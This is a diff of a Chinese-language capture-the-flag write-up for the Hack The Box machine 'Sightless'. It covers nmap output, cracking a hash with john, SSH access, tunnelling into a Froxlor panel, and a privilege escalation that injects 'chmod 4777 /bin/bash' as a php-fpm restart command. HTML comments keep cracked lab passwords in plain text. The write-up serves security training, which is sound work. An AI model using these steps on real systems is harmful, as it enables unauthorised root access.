@@ -16,9 +16,6 @@ PORT   STATE SERVICE VERSION
 |     Invalid command: try being more creative
 |_    Invalid command: try being more creative
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
-|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 |_http-title: Sightless.htb
 |_http-server-header: nginx/1.18.0 (Ubuntu)
@@ -89,16 +86,16 @@ $ john hash -w=/usr/share/wordlists/rockyou.txt
 ...
 ```
 
-<!-- ssh 使用 michael/insaneclownposse 登录成功 -->
+<!-- ssh 使用 michael:insaneclownposse 登录成功 -->
 
-ssh 使用 michael/⬛⬛⬛ 登录成功
+ssh 使用 michael:⬛⬛⬛ 登录成功
 
 ```shell
 michael@sightless:~$ ls
 user.txt
 ```
 
-开始提权
+## Privilege Escalation
 
 ```shell
 # 无果
@@ -153,7 +150,7 @@ $ ssh -L 18888:127.0.0.1:18888 michael@sightless.htb -N -f
 
 <!-- Devices -> Configure -> localhost:18888 -> Enable port forwarding -> Done -> Remote Target -> Froxlor -> inspect -> 开发者控制台 Network -> index.php -> payload -> admin/ForlorfroxAdmin -->
 
-Devices -> Configure -> localhost:18888 -> Enable port forwarding -> Done -> Remote Target -> Froxlor -> inspect -> 开发者控制台 Network -> index.php -> payload -> admin/⬛⬛⬛
+Devices -> Configure -> localhost:18888 -> Enable port forwarding -> Done -> Remote Target -> Froxlor -> inspect -> 开发者控制台 Network -> index.php -> payload -> admin:⬛⬛⬛
 
 登录进入 Froxlor -> PHP -> PHP-FPM versions -> Create new PHP version -> php-fpm restart command: chmod 4777 /bin/bash -> save -> System -> Settings -> PHP-FPM -> SAVE -> Click here to continue
 
